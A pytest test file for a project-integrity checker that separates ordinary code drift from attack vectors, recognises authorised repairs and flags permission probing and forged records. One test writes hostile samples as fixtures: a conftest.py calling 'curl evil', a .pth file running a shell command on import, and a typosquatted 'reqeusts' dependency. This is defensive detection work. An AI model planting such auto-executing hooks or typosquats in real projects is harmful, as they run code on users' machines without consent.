from end_to_end.conftest import ALICE, BOB
from helpers import make_passing_project, make_renamed_api_project, write

from yemendev.core.contracts import PermissionDeniedError, sha256_bytes
from yemendev.governance.actors import Actor, ActorKind, Role
from yemendev.orion.tasks import TaskStatus
from yemendev.recovery.model import FilePatch, PlanSource, RepairPlan


def test_clean_project_has_no_security_findings(platform, tmp_path):
    proj = platform.register_project(ALICE, "ok", str(make_passing_project(tmp_path / "ok")))
    platform.scan_project(ALICE, proj.id)
    r = platform.immune_check(ALICE, proj.id)
    assert r.summary["security"] == 0 and r.baseline_scan_id


def test_drift_vs_attack_vectors(platform, tmp_path):
    root = make_passing_project(tmp_path / "p")
    write(root, "conftest.py", "")
    write(root, "pyproject.toml", '[project]\nname="x"\ndependencies=["six"]\n')
    proj = platform.register_project(ALICE, "p", str(root))
    platform.scan_project(ALICE, proj.id)
    write(root, "pkg/m.py", "def f():\n    return 2\n")                                  # ordinary drift
    write(root, "conftest.py", "import os\nos.system('curl evil')\n")                     # auto-exec changed
    write(root, "evil.pth", "import os; os.system('id')\n")                               # persistence vector
    write(root, "pyproject.toml", '[project]\nname="x"\ndependencies=["six", "reqeusts"]\n')  # build + typosquat
    r = platform.immune_check(ALICE, proj.id)
    by = {(f.rule, f.subject): f for f in r.findings}
    assert by[("unrecorded-change", "pkg/m.py")].category == "operational"
    assert by[("auto-executing-file-changed", "conftest.py")].severity == "high"
    assert by[("auto-executing-file-added", "evil.pth")].category == "security"
    assert by[("build-or-ci-changed", "pyproject.toml")].category == "security"
    assert by[("possible-typosquatting", "reqeusts")].certainty == "inferred"
    assert by[("dependency-added", "reqeusts")].category == "operational"
    assert r.summary["high"] == 2


def test_platform_applied_change_is_recognised_as_authorized(platform, wf, tmp_path):
    root = make_renamed_api_project(tmp_path / "p")
    api = root / "calc/api.py"
    plan = RepairPlan(id="pln_i", description="fix", source=PlanSource.HUMAN, source_ref="x", patches=[FilePatch(
        path="calc/api.py", original_sha256=sha256_bytes(api.read_bytes()),
        new_content=api.read_text().replace("add_numbers", "add"))])
    proj = platform.register_project(ALICE, "c", str(root))
    platform.grant_member(ALICE, proj.id, BOB.ref, Role.OPERATOR)
    t = wf.create(ALICE, proj.id, human_plan=plan)
    wf.advance(ALICE, t.id)
    platform.decide_approval(BOB, platform.approvals.for_task(t.id)[0].id, approve=True)
    assert wf.advance(ALICE, t.id).task.status is TaskStatus.SUCCEEDED
    # the baseline scan was taken before the repair; the change must not look like drift
    with platform.db.transaction() as conn:  # keep only the first (pre-repair) scan as baseline
        conn.execute("DELETE FROM project_scans WHERE project_id = ? AND id != (SELECT id FROM project_scans WHERE "
                     "project_id = ? ORDER BY created_at LIMIT 1)", (proj.id, proj.id))
    r = platform.immune_check(ALICE, proj.id)
    assert [f.rule for f in r.findings if f.subject == "calc/api.py"] == ["authorized-change"]


def test_integrity_violation_and_probing_are_security_findings(platform, tmp_path):
    proj = platform.register_project(ALICE, "ok", str(make_passing_project(tmp_path / "ok")))
    platform.scan_project(ALICE, proj.id)
    eve = Actor(id="eve", kind=ActorKind.HUMAN, role=Role.OPERATOR)
    for _ in range(5):
        try:
            platform.scan_project(eve, proj.id)
        except PermissionDeniedError:
            pass
    with platform.db.transaction() as conn:
        conn.execute("UPDATE evidence_records SET outcome = 'forged' WHERE rowid = 1")
    rules = {f.rule: f for f in platform.immune_check(ALICE, proj.id).findings}
    assert rules["repeated-permission-denials"].subject == "human:eve"
    assert rules["platform-integrity-violation"].severity == "high"


def test_continuity_debt_is_experimental_and_never_guesses(platform, tmp_path):
    proj = platform.register_project(ALICE, "ok", str(make_passing_project(tmp_path / "ok")))
    platform.scan_project(ALICE, proj.id)
    d = platform.continuity_debt(ALICE, proj.id)
    assert d.status.startswith("EXPERIMENTAL")
    comps = {c.name: c for c in d.components}
    assert comps["unverified_backups"].value is None and d.measured_components == len(comps) - 1
    assert comps["missing_documentation"].value == 1.0 and comps["untested_recovery"].value == 1.0
    assert 0 <= d.score <= 1
